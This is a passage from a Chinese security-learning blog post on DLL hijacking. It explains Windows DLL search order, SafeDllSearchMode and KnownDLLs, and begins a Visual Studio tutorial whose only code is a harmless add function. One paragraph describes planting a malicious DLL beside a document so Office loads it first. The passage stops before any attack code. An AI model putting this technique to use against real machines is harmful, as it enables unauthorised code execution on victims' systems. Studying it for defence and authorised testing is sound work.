<html>
<head>
<title>科普DLL劫持原理与实践</title>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0,viewport-fit=cover">
<style>
*{margin:0;padding:0;max-width:100%;box-sizing:border-box;}html{-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%;line-height:1.6}img{z-index:999;position:relative;max-width:100%;margin:10px 0;}body{-webkit-touch-callout:none;font family:-apple-system-font,BlinkMacSystemFont,"Helvetica Neue","PingFang SC","Hiragino Sans GB","Microsoft YaHei UI","Microsoft YaHei",Arial,sans-serif;color:#333;letter-spacing:.034em}h1,h2,h3,h4,h5,h6{font-weight:400;font-size:16px;line-height:36px;}a{color:#576b95;text-decoration:none;-webkit-tap-highlight-color:rgba(0,0,0,0)}td,th{word-wrap:break-word;padding:5px 10px;border:1px solid #DDD;}table{margin-bottom:10px;border-collapse:collapse;display:table;width:100%!important;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}.rich_media_area_primary{padding:20px 16px 12px;background-color:#fafafa}@media (max-width:375px){.rich_media_area_primary{padding:20px 60px 15px 60px}.rich_media_area_extra{padding:0 60px 21px 60px}}@media (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner,body{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media{padding:20px;}.appmsg_skin_default .rich_media_area_primary{background-color:#fff}.appmsg_skin_default .rich_media_area_primary .weui-loadmore_line .weui-loadmore__tips{background-color:#fff}@media screen and (min-width:1024px){.rich_media_area_primary_inner,.rich_media_area_extra_inner{max-width:677px;margin-left:auto;margin-right:auto}.rich_media_area_primary{padding-top:32px}}.rich_media_content{overflow:hidden;color:#333;font-size:17px;line-height:37px;;word-wrap:break-word;-webkit-hyphens:auto;-ms-hyphens:auto;hyphens:auto;text-align:justify;position:relative;z-index:0}.rich_media_content *{max-width:100%!important;box-sizing:border-box!important;-webkit-box-sizing:border-box!important;word-wrap:break-word!important}.rich_media_content p{clear:both;min-height:1em}.rich_media_content em{font-style:italic}.rich_media_content fieldset{min-width:0}.rich_media_content .list-paddingleft-1,.rich_media_content .list-paddingleft-2,.rich_media_content .list-paddingleft-3{padding-left:2.2em}.rich_media_content .list-paddingleft-1 .list-paddingleft-2,.rich_media_content .list-paddingleft-2 .list-paddingleft-2,.rich_media_content .list-paddingleft-3 .list-paddingleft-2{padding-left:30px}.rich_media_content .list-paddingleft-1{padding-left:1.2em}.rich_media_content .list-paddingleft-3{padding-left:3.2em}.rich_media_content .code-snippet,.rich_media_content .code-snippet__fix{max-width:1000%!important}.rich_media_content .code-snippet *,.rich_media_content .code-snippet__fix *{max-width:1000%!important}.rich_media_title{font-size:22px;line-height:42px;;line-height:1.4;margin:10px 0;padding-bottom:10px;border-bottom:1px solid #e7e7eb;}@supports(-webkit-overflow-scrolling:touch){.rich_media_title{font-weight:700}}.rich_media_meta{display:inline-block;vertical-align:middle;margin:0 10px 10px 0;font-size:15px;line-height:35px;;line-height:35px;;line-height:35px;;line-height:35px;;-webkit-tap-highlight-color:rgba(0,0,0,0)}.rich_media_meta.icon_appmsg_tag{margin-right:4px}.rich_media_meta.meta_tag_text{margin-right:0}.rich_media_meta_list em{font-style:normal}.rich_media_meta_text{color:rgba(0,0,0,0.3)}p{margin:0;}.msgBox{margin-top:20px;padding-top:20px;padding-left:50px;overflow:hidden;border-top:2px dashed #09a2ff;}.msg{padding-top:7px;clear:both;}.msgBody{float:right;width:100%;margin-left:55px;padding-bottom:15px;border-bottom:1px dashed #e0e0e0;}.userHeadImg{float:left;margin-left:-50px;}.userHeadImg img{width:40px;height:40px;margin-right:10px;border-radius:3px;}.userName{color:#888888;line-height:24px;font-size:14px;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;line-height:34px;;margin:5px 0 5px 0;height:24px;}.replyBody,.autherBody{color:#565656;font-size:15px;}.replyIcon{border-left:4px solid #33ab01;margin-right:5px;}.ad{text-decoration:none;color:#d6d4d4;font-size:12px;line-height:32px;;}.msgBodyReply{padding-top:5px;}.userName span{float:right;color:#afafaf;font-size:14px;}code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;}.code-snippet__fix{font-size:14px;margin:10px 0;display:block;color:#333;position:relative;background-color:rgba(0,0,0,0.03);border:1px solid #f0f0f0;border-radius:2px;display:-webkit-box;display:-webkit-flex;display:flex;padding-left:25px;line-height:26px}.code-snippet__fix code{text-align:left;font-size:14px;display:block;white-space:pre;display:-webkit-box;display:-webkit-flex;display:flex;position:relative;font family:Consolas,"Liberation Mono",Menlo,Courier,monospace}.code-snippet__comment,.code-snippet__quote{color:#afafaf;font-style:italic}.code-snippet__keyword,.code-snippet__selector-tag,.code-snippet__subst{color:#ca7d37}.code-snippet__number,.code-snippet__literal,.code-snippet__variable,.code-snippet__template-variable,.code-snippet__tag .code-snippet__attr{color:#0e9ce5}.code-snippet__string,.code-snippet__doctag{color:#d14}.code-snippet__title,.code-snippet__section,.code-snippet__selector-id{color:#d14}.code-snippet__subst{font-weight:normal}.code-snippet__type,.code-snippet__class .code-snippet__title{color:#0e9ce5}.code-snippet__tag,.code-snippet__name,.code-snippet__attribute{color:#0e9ce5;font-weight:normal}.code-snippet__regexp,.code-snippet__link{color:#ca7d37}.code-snippet__symbol,.code-snippet__bullet{color:#d14}.code-snippet__built_in,.code-snippet__builtin-name{color:#ca7d37}.code-snippet__meta{color:#afafaf}.code-snippet__deletion{background:#fdd}.code-snippet__addition{background:#dfd}.code-snippet__emphasis{font-style:italic}.code-snippet__strong{font-weight:bold}.account_avatar{width:40px;height:40px;padding:0;}.account_info{display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;padding:20px 0;align-items:center}.flex_bd{padding-left:14px;}.account_nickname{display:inline-block;vertical-align:middle;line-height:1.2;color:#576b95;font-size:14px}.account_desc{overflow:hidden;text-overflow:ellipsis;display:-webkit-box;-webkit-box-orient:vertical;-webkit-line-clamp:1;color:rgba(0,0,0,0.3);font-size:14px;line-height:1.2;padding-top:.4em}.msg_source_url{text-align:left;word-break:break-all;margin-top:20px;}.msg_source_url a{padding-right:10px;}.msg_source_url .url_text{color:#a8a8a8;}.video-desc{font-size:14px;margin-top:15px;color:#6c6c6c;}.msg_source_url{text-align:left;}.original_primary_card_tips{color:rgba(0,0,0,0.3);line-height:1.4;font-size:15px;}.weui-flex__item{margin-bottom:20px;padding:20px 16px;margin-top:16px;line-height:1.4;align-items:center;background-color:#f7f7f7;border-radius:8px;position:relative;}.original_primary_desc{color:rgba(0,0,0,0.5);font-size:14px;padding-top:4px;width:auto;overflow:hidden;text-overflow:ellipsis;}.msgBodyReplyList{border-top:1px solid #e1e1e1;margin-top:10px;}.msgBodyReplyListTop{border-top:0;}.reply_like_num{float:right;font-size:14px;color:#c7c7c7;}.msgData{margin-top:20px;color:#626262;}.msgData span{font-size:14px;padding-right:15px;}.msgData .likes{float:right;padding-right:0;}.js_text_content p{font-size:18px;line-height:38px;;}.rich_media_meta_link{font-size:15px;}blockquote {padding-left: 10px;border-left: 3px solid #dbdbdb;color: rgba(0,0,0,0.5);font-size:15px;line-height:35px;;padding-top: 4px;margin: 1em 0;}.video_iframe{width:500px;height:400px;}.blockquote_info{color:#b5b5b5;margin-top:10px;}.playVideoWx{position:relative;display:block;}.icon_mid_play{position:absolute;z-index:9999;top:50%;left:50%;display:-webkit-box;display:-webkit-flex;display:flex;-webkit-box-align:center;-webkit-align-items:center;align-items:center;-webkit-box-pack:center;-webkit-justify-content:center;justify-content:center;width:48px;height:48px;background:rgba(237,237,237,0.9);border-radius:50%}.icon_mid_play:before{content:"";text-indent:-999em;display:inline-block;width:28px;height:28px;vertical-align:middle;background-size:cover;background-image:url("data:image/svg+xml;charset=utf8,%3Csvg xmlns='http://www.w3.org/2000/svg' width='24' height='24' viewBox='0 0 24 24'%3E  %3Cpath fill='%23151515' fill-rule='evenodd' d='M9.524 4.938l10.092 6.21a1 1 0 0 1 0 1.704l-10.092 6.21A1 1 0 0 1 8 18.21V5.79a1 1 0 0 1 1.524-.852z'/%3E%3C/svg%3E")}
</style>
<link href="https://www.juyifx.cn/config/css/wxArticle.css" rel="stylesheet"/>
</head>
<body>
<div class="rich_media">
                
                <h1 class="rich_media_title" id="activity-name">
                    
                    
                    
科普 | DLL劫持原理与实践
                </h1>
                <div id="meta_content" class="rich_media_meta_list">
                                                                                                                <span class="rich_media_meta rich_media_meta_text">
                                                                    HACK学习
                                                            </span>
                                                                
                                        <span class="rich_media_meta rich_media_meta_nickname" id="profileBt">
                      <a href="javascript:void(0);" class=" weui-wa-hotarea" id="js_name">
                        HACK学习呀                      </a>
                      <div id="js_profile_qrcode" class="profile_container" style="display:none;">
                          <div class="profile_inner">
                              <strong class="profile_nickname">HACK学习呀</strong>
                              

                              <p class="profile_meta">
                              <label class="profile_meta_label">微信号</label>
                              <span class="profile_meta_value">Hacker1961X</span>
                              </p>

                              <p class="profile_meta">
                              <label class="profile_meta_label">功能介绍</label>
                              <span class="profile_meta_value">HACK学习，专注于互联网安全与黑客精神；渗透测试，社会工程学，Python黑客编程，资源分享，Web渗透培训，电脑技巧，渗透技巧等，为广大网络安全爱好者一个交流分享学习的平台！</span>
                              </p>
                              
                          </div>
                          <span class="profile_arrow_wrp" id="js_profile_arrow_wrp">
                              <i class="profile_arrow arrow_out"></i>
                              <i class="profile_arrow arrow_in"></i>
                          </span>
                      </div>
                    </span>
                    <em id="publish_time" class="rich_media_meta rich_media_meta_text">2019-09-02</em>
                </div>

                
                                                <div id="js_tags"  class="article-tag__list" style="display: none;" data-len="0">
                                            
                        <div class="article-tag-card__title">收录于话题</div>
                        <div class="article-tags">
                                                    </div>
                                    </div><div id="weixin_content"><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);" data-mpa-powered-by="yiban.io"><span style="font-size:15px;line-height:35px;;"><strong>0x00 前言</strong></span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">DLL劫持算是一个老的漏洞，而且乌云漏洞库中也有很多的案例，只不过案例更多的只是验证一下，并没有教如何利用。</span><span style="font-size:15px;line-height:35px;;">至于为什么专门抓起来再学一遍了，唉，内网渗透需要</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;"><strong>0x01 什么是DLL</strong></span></p><p><span style="font-size:15px;line-height:35px;;">这里先摘抄一下百度百科的解释：</span></p><blockquote><p>DLL(Dynamic Link Library)文件为动态链接库文件，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件。</p></blockquote><p><span style="font-size:15px;line-height:35px;;">还有一段，我觉得更好理解的。</span><br  /></p><blockquote><p>DLL 是一个包含可由多个程序同时使用的代码和数据的库。例如，在 Windows 操作系统中，Comdlg32 DLL 执行与对话框有关的常见函数。因此，每个程序都可以使用该 DLL 中包含的功能来实现“打开”对话框。这有助于促进代码重用和内存的有效使用。</p></blockquote><p><span style="font-size:15px;line-height:35px;;"><strong>0x02 动态链接库加载顺序</strong></span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">一、Windows XP SP2之前</span><br  /><span style="font-size:15px;line-height:35px;;">Windows查找DLL的目录以及对应的顺序：</span></p><ol style="" class=" list-paddingleft-2"><li><p><span style="font-size:15px;line-height:35px;;">进程对应的应用程序所在目录；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">当前目录（Current Directory）；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">系统目录（通过 GetSystemDirectory 获取）；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">16位系统目录；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">Windows目录（通过 GetWindowsDirectory 获取）；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">PATH环境变量中的各个目录；</span></p></li></ol><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">例如：</span><span style="font-size:15px;line-height:35px;;">对于文件系统,如doc文档打开会被应用程序office打开，而office运行的时候会加载系统的一个dll文件，如果我们将用恶意的dll来替换系统的dll文件，就是将DLL和doc文档放在一起，运行的时候就会在当前目录中找到DLL，从而优先系统目录下的DLL而被执行。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">二、在Windows xp sp2之后</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">Windows查找DLL的目录以及对应的顺序（SafeDllSearchMode 默认会被开启）：</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">默认注册表为：</span><span style="font-size:15px;line-height:35px;;">HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager\SafeDllSearchMode，其键值为1</span></p><ol style="" class=" list-paddingleft-2"><li><p><span style="font-size:15px;line-height:35px;;">进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">系统目录（即%windir%system32）；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">16位系统目录（即%windir%system）；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">Windows目录（即%windir%）；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">PATH环境变量中的各个目录；</span></p></li></ol><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">三、Windows7以上</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">系统没有了SafeDllSearchMode 而采用KnownDLLs，那么凡是此项下的DLL文件就会被禁止从EXE自身所在的目录下调用，而只能从系统目录即SYSTEM32目录下调用，其注册表位置：</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">计算机\HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><img class="" data-ratio="0.6375" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/1_bw89EOwVWwQ1U22DsjNwQLGBN9uwxQ.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4AwOdKM95ickIVIrGJHPUQEQxAibw89EOwVWwQ1U22DsjNwQLGBN9uwxQ/640?wx_fmt=png'" data-type="png" data-w="1360" style="border-width: 0px;border-style: initial;border-color: initial;display: block;margin: 1rem auto;"  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">那么最终Windows2003以上以及win7以上操作系统通过“DLL路径搜索目录顺序”和“KnownDLLs注册表项”的机制来确定应用程序所要调用的DLL的路径，之后，应用程序就将DLL载入了自己的内存空间，执行相应的函数功能。</span></p><ol style="" class=" list-paddingleft-2"><li><p><span style="font-size:15px;line-height:35px;;">进程对应的应用程序所在目录（可理解为程序安装目录比如C:ProgramFilesuTorrent）；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">系统目录（即%windir%system32）；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">16位系统目录（即%windir%system）；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">Windows目录（即%windir%）；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">当前目录（运行的某个文件所在目录，比如C:DocumentsandSettingsAdministratorDesktoptest）；</span></p></li><li><p><span style="font-size:15px;line-height:35px;;">PATH环境变量中的各个目录；</span></p></li></ol><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;"><strong>0x03 编写一个DLL</strong></span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">IDE：</span><span style="font-size:15px;line-height:35px;;">vs2017</span></p><p><span style="font-size:15px;line-height:35px;;">语言：</span><span style="font-size:15px;line-height:35px;;">C\C++</span></p><blockquote><p>DLL写法不止下面我用的这个写法，还有其它嵌套写法（别问我怎么知道的，为了这篇文章，我踩了N个坑 = =！）</p></blockquote><p><span style="font-size:15px;line-height:35px;;">1、进入一个文件夹目录，鼠标右键，用 “在 Visual Studio 中打开（V）” ，打开。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">2、然后 文件→新建→项目→[已安装 &gt; Visual C++ &gt; Windows桌面]→动态链接库（DLL），生成一个cpp文件。</span></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">这里我命名为 shiyan_dll</span></p><p style="text-align: center;"><img class="rich_pages" data-ratio="0.56640625" data-s="300,640" src="图片/HACK学习呀_2019-09-02_科普DLL劫持原理与实践/2_iaNN5MNRS1zhv6nRdVkpicCIwVp69g.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvouic2rxRwv8Yl4mJhZiapxTQn4CloyXuybLSBax6tCBiajlv21Z5siaNN5MNRS1zhv6nRdVkpicCIwVp69g/640?wx_fmt=png'" data-type="png" data-w="1280" style=""  /></p><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:15px;line-height:35px;;">3、然后在源文件 shiyan_dll.cpp 中填入如下代码：</span></p><figure class="highlight c++" style="margin-top: 1em;margin-bottom: 1em;background: rgb(238, 238, 238);padding: 1em;border-radius: 2px;text-shadow: rgb(255, 255, 255) 0px 0px 1px;line-height: 1.6;overflow: auto;font-size: 0.9em;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;text-align: start;white-space: normal;"><table width="720" style="width: 654px;"><tbody><tr><td class="gutter" style="padding: 0.6em 15px 0.6em 0.6em;text-align: right;vertical-align: top;" width="20"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="height: 20px;font-size:15px;line-height:35px;;">1</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">2</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">3</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">4</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">5</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">6</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">7</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">8</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">9</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">10</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">11</span><br  /></pre></td><td class="code" style="padding: 0.6em 0.6em 0.6em 15px;vertical-align: top;border-left-color: rgb(255, 255, 255);color: rgb(102, 102, 102);"><pre style="overflow: auto hidden;font family: monospace, monospace;font-size: 1em;border-width: initial;border-style: none;border-color: initial;"><span style="color: rgb(147, 161, 161);font-style: italic;height: 20px;font-size:15px;line-height:35px;;">// shiyan_dll.cpp : 定义 DLL 应用程序的导出函数。</span><br  /><span style="color: rgb(147, 161, 161);font-style: italic;height: 20px;font-size:15px;line-height:35px;;">//</span><br  /><span style="font-size:15px;line-height:35px;;"><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"></span><br  /><span class="line" style="font-size:15px;line-height:35px;;height: 20px;">#include "stdafx.h"</span></span><br  /><span style="font-size:15px;line-height:35px;;"><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"></span><br  /><span class="line" style="font-size:15px;line-height:35px;;height: 20px;">#include "shiyan_dll.h"</span></span><br  /><span style="font-size:15px;line-height:35px;;"><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"></span><br  /><span class="line" style="font-size:15px;line-height:35px;;height: 20px;"><span class="keyword" style="font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">int</span> <span class="title" style="font-size:15px;line-height:35px;;color: rgb(38, 139, 210);">add</span>(<span class="keyword" style="font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">int</span> x, <span class="keyword" style="font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">int</span> y)</span></span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">{</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;"><span class="keyword" style="height: 20px;font-size:15px;line-height:35px;;color: rgb(133, 153, 0);">return</span> x + y;</span><br  /><span style="height: 20px;font-size:15px;line-height:35px;;">}</span><br  /></pre></td></tr></tbody></table></figure><p style="margin-top: 2rem;margin-bottom: 2rem;line-height: 1.8;color: rgb(66, 66, 66);font family: &quot;Segoe UI&quot;, &quot;Lucida Grande&quot;, Helvetica, &quot;Microsoft YaHei&quot;, FreeSans, Arimo, &quot;Droid Sans&quot;, &quot;wenquanyi micro hei&quot;, &quot;Hiragino Sans GB&quot;, &quot;Hiragino Sans GB W3&quot;, Arial, sans-serif;font-size:16px;line-height:36px;;text-align: start;white-space: normal;"><span style="font-size:15px;line-height:35px;;"><span style="background-color: rgb(255, 255, 255);">4、在头文件</span>拿<span style="background-color: 